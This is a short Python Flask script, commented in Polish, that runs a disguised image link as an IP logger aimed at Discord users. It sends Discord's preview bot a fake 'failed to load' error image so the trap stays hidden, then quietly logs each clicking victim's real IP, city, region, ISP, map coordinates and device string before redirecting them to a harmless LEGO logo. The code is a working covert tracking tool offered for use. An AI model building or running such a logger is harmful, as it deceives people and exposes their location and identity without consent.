from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# --- KONFIGURACJA ---
# Bezpośredni link do grafiki błędu z Reddita
REDDIT_ERROR_IMG = "https://preview.redd.it/failed-to-load-image-on-mobile-v0-v9v846fbt01a1.png?width=1080&format=png&auto=webp&s=5568f1857948270139b8f2f458e0a3f6a27e029c"
# Prawdziwe zdjęcie dla ofiary
REAL_IMG = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png"

@app.route('/image.png')
def logger():
    ua = request.headers.get('User-Agent', '')
    
    # POPRAWKA IP: Render używa proxy, więc musimy wyciągnąć prawdziwe IP stąd:
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # 1. Jeśli to bot Discorda - dajemy obrazek błędu
    if "Discordbot" in ua or "externalhit" in ua.lower():
        print(f"--- BOT DISCORDA SPRAWDZA: {ua[:30]} ---")
        return redirect(REDDIT_ERROR_IMG)

    # 2. LOGOWANIE DANYCH (Teraz z poprawnym IP)
    print(f"\n[!!!] KTOŚ KLIKNĄŁ [!!!]")
    print(f"Prawdziwe IP: {ip}")
    
    try:
        # Odpytujemy API o miasto, kraj i województwo (regionName)
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,lat,lon", timeout=5).json()
        if r.get("status") == "success":
            print(f"KRAJ: {r.get('country')}")
            print(f"WOJEWÓDZTWO: {r.get('regionName')}")
            print(f"MIASTO: {r.get('city')}")
            print(f"MAPA: https://www.google.com/maps?q={r.get('lat')},{r.get('lon')}")
        else:
            print(f"API Error: {r.get('message')}")
    except Exception as e:
        print(f"Błąd lokalizacji: {e}")

    print(f"URZĄDZENIE: {ua}")
    print(f"-----------------------------------\n")

    return redirect(REAL_IMG)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
